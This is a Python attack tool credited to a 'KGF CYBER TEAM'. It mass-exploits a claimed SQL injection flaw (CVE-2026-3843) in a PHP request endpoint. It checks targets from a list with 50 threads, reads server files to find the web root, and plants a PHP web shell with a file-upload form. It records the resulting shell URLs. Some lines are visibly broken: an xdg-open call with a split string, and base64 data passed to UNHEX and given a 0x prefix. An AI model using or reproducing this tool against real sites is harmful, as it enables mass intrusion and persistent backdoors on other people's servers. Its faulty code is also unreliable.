#_____ SEND BY :- KGF CYBER TEAM 
#____, TELIGERM : KALYAN KING 
import sys
import os
import base64
import secrets
import time
import threading
import random
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
from colorama import init, Fore, Style

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
os.system("xdg-open 
")
BANNER = f"""
{Fore.YELLOW}  Developed by {Fore.WHITE}[{Style.RESET_ALL}{Fore.GREEN}@KALYAN_KING{Fore.RESET}]

     █─▄▀ ▄█─  █▄─ █  █▀▀█ 　  █▀▀█ ─█▀█─ ▀▀█▀▀ 　 ▀▀█▀▀  █▀▀▀█  █▀▀▀█  █───  █▀▀▀█ 
     █▀▄─ ─█─  █ █ █  █─▄▄ 　  █─── █▄▄█▄ ─ █── 　 ─ █──  █── █  █── █  █─── ─▀▀▀▄▄ 
     █─ █ ▄█▄  █──▀█  █▄▄█ 　  █▄▄█ ───█─ ─ █── 　 ─ █──  █▄▄▄█  █▄▄▄█  █▄▄█  █▄▄▄█
    
                    [ {Fore.YELLOW}CVE-2026-3843 – SQL Injection RCE{Fore.RESET}  ]
  --| Telegram: {Fore.GREEN}KGF CYBER TEAM {Fore.RESET} |--
{Fore.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}
"""

VERIFY_MARKER = f"HACKFUT_{secrets.token_hex(6).upper()}"
K1NG_SHELL_TEMPLATE = """<?php
@error_reporting(0);
echo "%s";
echo '<a href="https://t.me/K1NG_C4T">K1NG C4T TOOLS</a><pre>'.php_uname()."\\n";
echo '<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';
if($_POST){
    if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){
        echo 'OK';
    }else{
        echo 'ER';
    }
}
?>"""
K1NG_SHELL = K1NG_SHELL_TEMPLATE % VERIFY_MARKER

OUT_SHELL = "shells.txt"
OUT_VULN = "vuln.txt"
TIMEOUT = 15
THREADS = 50

lock = threading.Lock()
done = 0
total = 0

def save_shell(url):
    with lock:
        with open(OUT_SHELL, "a", encoding="utf-8") as f:
            f.write(url + "\n")

def save_vuln(target):
    with lock:
        with open(OUT_VULN, "a", encoding="utf-8") as f:
            f.write(target + "\n")

def normalize_url(target):
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    return target.rstrip("/")

def sql_inject(target, sql_query):
    endpoint = "/php/request.php"
    url = target + endpoint
    data = {
        "action": "do",
        "sql": sql_query,
        "reload_driver": "0"
    }
    try:
        resp = requests.post(url, data=data, timeout=TIMEOUT, verify=False,
                            headers={"User-Agent": "Mozilla/5.0"})
        if resp.status_code == 200:
            return resp.text
    except:
        pass
    return None

def get_database_name(target):
    query = "SELECT DATABASE()"
    result = sql_inject(target, query)
    if result:
        match = re.search(r'([a-zA-Z0-9_]+)', result)
        if match:
            return match.group(1)
    return None

def detect_vuln(target):
    test_query = "SELECT 1"
    result = sql_inject(target, test_query)
    if result and "1" in result:
        return True
    error_query = "SELECT 1 UNION SELECT 2"
    result = sql_inject(target, error_query)
    if result and "2" in result:
        return True
    return False

def find_web_path(target):
    common_paths = [
        "/var/www/html",
        "/var/www",
        "/var/www/public_html",
        "/var/www/htdocs",
        "/opt/lampp/htdocs",
        "/usr/share/nginx/html",
        "/srv/www",
        "/web",
        "/www",
        "/htdocs",
        "/public_html",
        "/html"
    ]
    
    for path in common_paths:
        test_query = f"SELECT LOAD_FILE('{path}/index.php')"
        result = sql_inject(target, test_query)
        if result and "<?php" in result:
            return path
    return "/var/www/html"

def upload_shell(target):
    web_path = find_web_path(target)
    fname = f"k1ng_{secrets.token_hex(4)}.php"
    full_path = f"{web_path}/{fname}"
    
    b64_shell = base64.b64encode(K1NG_SHELL.encode()).decode()
    
    sql_query = f"""SELECT UNHEX('{b64_shell}') INTO OUTFILE '{full_path}'"""
    result = sql_inject(target, sql_query)
    
    if not result or "error" in result.lower():
        writer = f"""<?php file_put_contents('{full_path}', base64_decode('{b64_shell}')); ?>"""
        b64_writer = base64.b64encode(writer.encode()).decode()
        sql_query2 = f"""SELECT UNHEX('{b64_writer}') INTO OUTFILE '/tmp/write.php'"""
        sql_inject(target, sql_query2)
        sql_query3 = "SELECT LOAD_FILE('/tmp/write.php')"
        sql_inject(target, sql_query3)
        sql_exec = f"""SELECT '<?php system("php /tmp/write.php"); ?>' INTO OUTFILE '/tmp/exec.php'"""
        sql_inject(target, sql_exec)
        sql_inject(target, "SELECT LOAD_FILE('/tmp/exec.php')")
    
    sql_query3 = f"""SELECT 0x{b64_shell} INTO DUMPFILE '{full_path}'"""
    sql_inject(target, sql_query3)
    
    time.sleep(3)
    
    shell_url = f"{target}/{fname}"
    try:
        resp = requests.get(shell_url, timeout=TIMEOUT, verify=False)
        if resp.status_code == 200 and VERIFY_MARKER in resp.text:
            return shell_url
    except:
        pass
    
    alt_paths = [
        f"{target}/media/{fname}",
        f"{target}/images/{fname}",
        f"{target}/assets/{fname}",
        f"{target}/css/{fname}",
        f"{target}/js/{fname}",
    ]
    for url in alt_paths:
        try:
            resp = requests.get(url, timeout=TIMEOUT, verify=False)
            if resp.status_code == 200 and VERIFY_MARKER in resp.text:
                return url
        except:
            pass
    
    return None

def exploit_single(target):
    target = normalize_url(target)
    print(f"{Fore.CYAN}[*] Testing {target}{Fore.RESET}")
    
    if not detect_vuln(target):
        print(f"{Fore.RED}[-] Not vulnerable{Fore.RESET}")
        return None
    
    print(f"{Fore.GREEN}[+] Vulnerable!{Fore.RESET}")
    save_vuln(target)
    
    print(f"{Fore.CYAN}[*] Uploading shell...{Fore.RESET}")
    shell_url = upload_shell(target)
    if shell_url:
        print(f"{Fore.GREEN}[+] Shell uploaded: {shell_url}{Fore.RESET}")
        save_shell(shell_url)
        return shell_url
    else:
        print(f"{Fore.RED}[-] Shell upload failed{Fore.RESET}")
        return None

def mass_scan(targets):
    global done, total
    total = len(targets)
    print(f"{Fore.CYAN}[+] Loaded {total} targets, threads={THREADS}{Fore.RESET}\n")
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(process_target, t): t for t in targets}
        for future in as_completed(futures):
            domain = future.result()
            with lock:
                done += 1
            if domain:
                print(f"{Fore.GREEN}[+] [{done}/{total}] {domain} -> SHELL UPLOADED{Fore.RESET}")
            else:
                print(f"{Fore.RED}[-] [{done}/{total}] {domain} -> FAILED{Fore.RESET}")

def process_target(target):
    try:
        shell = exploit_single(target)
        if shell:
            return target
    except:
        pass
    return None

def main():
    global THREADS
    print(BANNER)
    
    source = input(f"{Fore.CYAN}[?] Enter target URL or file path: {Fore.RESET}").strip()
    if not source:
        print(f"{Fore.RED}[-] No input{Fore.RESET}")
        sys.exit(1)
    
    targets = []
    if os.path.isfile(source):
        with open(source, "r", encoding="utf-8", errors="ignore") as f:
            targets = [line.strip() for line in f if line.strip()]
        if not targets:
            print(f"{Fore.RED}[-] No targets in file{Fore.RESET}")
            sys.exit(1)
        try:
            th = input(f"{Fore.CYAN}[?] Threads (default {THREADS}): {Fore.RESET}").strip()
            if th:
                THREADS = int(th)
        except:
            pass
        mass_scan(targets)
    else:
        target = normalize_url(source)
        exploit_single(target)
    
    print(f"\n{Fore.GREEN}[+] Done! Check {OUT_SHELL} and {OUT_VULN}{Fore.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Fore.RESET}")
        sys.exit(1)
